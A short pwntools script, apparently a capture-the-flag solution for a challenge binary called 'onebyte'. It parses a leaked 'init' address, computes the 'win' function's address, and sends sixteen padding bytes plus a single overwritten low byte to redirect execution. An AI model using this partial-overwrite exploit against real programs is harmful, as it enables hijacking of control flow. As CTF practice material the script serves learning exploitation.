from pwn import *

e = ELF('/mnt/c/Users/zahar/Downloads/onebyte')

context.terminal = ["tmux", "splitw"]
p = gdb.debug('/mnt/c/Users/zahar/Downloads/onebyte')
# p = process('/mnt/c/Users/zahar/Downloads/onebyte')
p.recvuntil(b': ')

init_address = int(p.recvline().strip(), 16)
win_address = init_address - e.symbols['init'] + e.symbols['win']
print("init address = ", hex(init_address))
print("win address = ", hex(win_address))

junk = 0x10 * b'A'
payload  = junk
payload += p8(win_address & 0xff)

p.recvuntil(b'Your turn: ')
p.sendline(payload)
p.interactive()